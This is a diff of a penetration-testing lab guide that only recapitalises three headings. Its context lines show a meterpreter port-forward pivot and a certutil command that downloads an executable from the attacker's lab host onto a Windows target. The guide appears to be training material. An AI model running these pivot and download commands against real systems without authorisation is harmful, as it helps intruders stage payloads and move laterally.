@@ -173,7 +173,7 @@ meterpreter > portfwd add -L 127.0.0.1 -l 8080 -p 80 -r 192.168.57.10
 | Base64 | `base64 -w0 file` (copy output) | `echo <base64> | base64 -d > file` |
 | Windows | — | `certutil -urlcache -f http://192.168.56.10/file out.exe` |
 
-## Common mistakes & tips
+## Common Mistakes & Tips
 
 - **Enumerate before exploiting.** Choose modules and payloads from *evidence*, not
   guesses — see `tools/nmap-cheatsheet.md`.
@@ -189,7 +189,7 @@ meterpreter > portfwd add -L 127.0.0.1 -l 8080 -p 80 -r 192.168.57.10
 - **Pivoting requires TCP-connect style scans** (`-sT`) through SOCKS; SYN scans do not
   work over proxychains.
 
-## Checklist / Self-test
+## Checklist / Self-Test
 
 - [ ] I can run every phase from recon to post-exploitation against my lab target.
 - [ ] I can produce and save Nmap output in all formats (`-oA`).
@@ -200,7 +200,7 @@ meterpreter > portfwd add -L 127.0.0.1 -l 8080 -p 80 -r 192.168.57.10
 - [ ] I can move a file target→Kali and Kali→target with two different methods.
 - [ ] I can set up an SSH local port forward or SOCKS proxy for pivoting.
 
-## Further resources
+## Further Resources
 
 - Nmap reference guide: <https://nmap.org/book/toc.html>
 - Metasploit documentation: <https://docs.metasploit.com/>
